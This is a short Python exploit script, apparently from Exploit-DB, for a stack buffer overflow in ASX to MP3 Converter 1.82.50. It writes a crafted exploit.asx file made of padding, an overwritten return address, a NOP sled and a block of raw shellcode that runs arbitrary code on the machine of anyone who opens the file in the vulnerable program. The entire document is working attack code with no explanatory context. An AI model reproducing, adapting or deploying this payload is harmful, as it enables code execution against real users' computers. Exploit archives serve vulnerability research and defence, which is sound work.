'''
# Exploit Title: ASX to MP3 Converter 1.82.50 Stack Overflow
# EDB ID: 38382
'''

import struct
filename = "exploit.asx"

dummy = b"A"* 241
EIP   = struct.pack('<I', 0x1003789d)
FFFF  = b"\xFF\xFF\xFF\xFF"
NOP   = b"\x90"*40
shellcode =  b""
shellcode += b"\xbf\x43\x9b\xda\x01\xda\xda\xd9\x74\x24\xf4\x5e\x31\xc9"
shellcode += b"\xb1\x52\x83\xee\xfc\x31\x7e\x0e\x03\x3d\x95\x38\xf4\x3d"
shellcode += b"\x41\x3e\xf7\xbd\x92\x5f\x71\x58\xa3\x5f\xe5\x29\x94\x6f"
shellcode += b"\x6d\x7f\x19\x1b\x23\x6b\xaa\x69\xec\x9c\x1b\xc7\xca\x93"
shellcode += b"\x9c\x74\x2e\xb2\x1e\x87\x63\x14\x1e\x48\x76\x55\x67\xb5"
shellcode += b"\x7b\x07\x30\xb1\x2e\xb7\x35\x8f\xf2\x3c\x05\x01\x73\xa1"
shellcode += b"\xde\x20\x52\x74\x54\x7b\x74\x77\xb9\xf7\x3d\x6f\xde\x32"
shellcode += b"\xf7\x04\x14\xc8\x06\xcc\x64\x31\xa4\x31\x49\xc0\xb4\x76"
shellcode += b"\x6e\x3b\xc3\x8e\x8c\xc6\xd4\x55\xee\x1c\x50\x4d\x48\xd6"
shellcode += b"\xc2\xa9\x68\x3b\x94\x3a\x66\xf0\xd2\x64\x6b\x07\x36\x1f"
shellcode += b"\x97\x8c\xb9\xcf\x11\xd6\x9d\xcb\x7a\x8c\xbc\x4a\x27\x63"
shellcode += b"\xc0\x8c\x88\xdc\x64\xc7\x25\x08\x15\x8a\x21\xfd\x14\x34"
shellcode += b"\xb2\x69\x2e\x47\x80\x36\x84\xcf\xa8\xbf\x02\x08\xce\x95"
shellcode += b"\xf3\x86\x31\x16\x04\x8f\xf5\x42\x54\xa7\xdc\xea\x3f\x37"
shellcode += b"\xe0\x3e\xef\x67\x4e\x91\x50\xd7\x2e\x41\x39\x3d\xa1\xbe"
shellcode += b"\x59\x3e\x6b\xd7\xf0\xc5\xfc\x18\xac\xe8\x0c\xf0\xaf\xf2"
shellcode += b"\xe9\x38\x39\x14\x9b\x2a\x6f\x8f\x34\xd2\x2a\x5b\xa4\x1b"
shellcode += b"\xe1\x26\xe6\x90\x06\xd7\xa9\x50\x62\xcb\x5e\x91\x39\xb1"
shellcode += b"\xc9\xae\x97\xdd\x96\x3d\x7c\x1d\xd0\x5d\x2b\x4a\xb5\x90"
shellcode += b"\x22\x1e\x2b\x8a\x9c\x3c\xb6\x4a\xe6\x84\x6d\xaf\xe9\x05"
shellcode += b"\xe3\x8b\xcd\x15\x3d\x13\x4a\x41\x91\x42\x04\x3f\x57\x3d"
shellcode += b"\xe6\xe9\x01\x92\xa0\x7d\xd7\xd8\x72\xfb\xd8\x34\x05\xe3"
shellcode += b"\x69\xe1\x50\x1c\x45\x65\x55\x65\xbb\x15\x9a\xbc\x7f\x35"
shellcode += b"\x79\x14\x8a\xde\x24\xfd\x37\x83\xd6\x28\x7b\xba\x54\xd8"
shellcode += b"\x04\x39\x44\xa9\x01\x05\xc2\x42\x78\x16\xa7\x64\x2f\x17"
shellcode += b"\xe2"

exploit = dummy + FFFF + EIP + NOP + shellcode

f = open(filename,'wb')
f.write(exploit)
f.close()